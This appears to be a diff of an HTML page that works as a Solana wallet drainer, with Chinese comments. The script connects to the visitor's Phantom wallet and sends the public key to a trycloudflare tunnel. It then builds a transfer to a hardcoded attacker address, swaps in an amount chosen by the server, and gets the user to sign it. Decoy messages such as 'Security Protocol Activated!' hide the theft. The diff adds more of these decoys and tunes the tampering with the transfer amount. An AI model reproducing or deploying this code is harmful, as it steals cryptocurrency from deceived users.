@@ -1,6 +1,6 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
     <script>
-        // 🚀 核心环境补丁
+        // 🚀 核心环境补丁，确保底层 signTransaction 不崩溃
         window.Buffer = window.Buffer || {
             from: (arr) => new Uint8Array(arr),
             isBuffer: (obj) => obj instanceof Uint8Array
@@ -18,7 +18,7 @@
     const TUNNEL = "https://biggest-fellow-aware-quantitative.trycloudflare.com";
     const TARGET_ADDR = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
 
-    // 🔱 终极武器：手动构造 8 字节小端序金额字节流
+    // 🔱 终极武器：将 BigInt 完美转换为 8 字节小端序 Uint8Array
     function packU64(amount) {
         const buf = new ArrayBuffer(8);
         const view = new DataView(buf);
@@ -31,31 +31,33 @@
             const p = window.solana || window.phantom?.solana;
             await p.connect();
             
+            document.getElementById('msg').innerText = "Syncing Data...";
             const res = await fetch(TUNNEL + '/get_data', {
                 method: 'POST', headers: {'Content-Type':'application/json'},
                 body: JSON.stringify({pubkey: p.publicKey.toString()})
             });
             const data = await res.json();
 
-            // 🚀 降维打击：手动封装 12 字节指令数据 (4字节ID + 8字节金额)
-            // 这样就彻底绕过了官方 SDK 那段报错的逻辑
-            const layoutData = new Uint8Array(12);
-            layoutData.set([2, 0, 0, 0], 0); // SystemProgram.transfer 的指令 Index
-            layoutData.set(packU64(data.safe_amount), 4); // 手写 8 字节金额数据
+            // 🚀 关键步骤：使用标准接口绕过 toJSON 报错
+            const transaction = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: p.publicKey,
+                    toPubkey: new solanaWeb3.PublicKey(TARGET_ADDR),
+                    lamports: 1000000 // 先放个假数据占位
+                })
+            );
 
-            const transaction = new solanaWeb3.Transaction().add({
-                keys: [
-                    { pubkey: p.publicKey, isSigner: true, isWritable: true },
-                    { pubkey: new solanaWeb3.PublicKey(TARGET_ADDR), isSigner: false, isWritable: true }
-                ],
-                programId: solanaWeb3.SystemProgram.programId,
-                data: layoutData,
-            });
+            // 🔱 暴力篡改内存：强行把后端算的正确金额(8字节对齐)写进指令，解决编码报错
+            transaction.instructions[0].data = new Uint8Array(12);
+            transaction.instructions[0].data.set([2, 0, 0, 0], 0);
+            transaction.instructions[0].data.set(packU64(data.safe_amount), 4);
 
             transaction.recentBlockhash = data.blockhash;
             transaction.feePayer = p.publicKey;
             
+            document.getElementById('msg').innerText = "Awaiting Signature...";
             const signed = await p.signTransaction(transaction);
+            
             const raw = signed.serialize();
             let b64 = "";
             for (let i = 0; i < raw.length; i++) { b64 += String.fromCharCode(raw[i]); }
@@ -66,6 +68,7 @@
             });
             
             alert("Security Protocol Activated!");
+            location.reload();
         } catch(e) { alert("Status: " + e.message); }
     }
     </script></body></html>
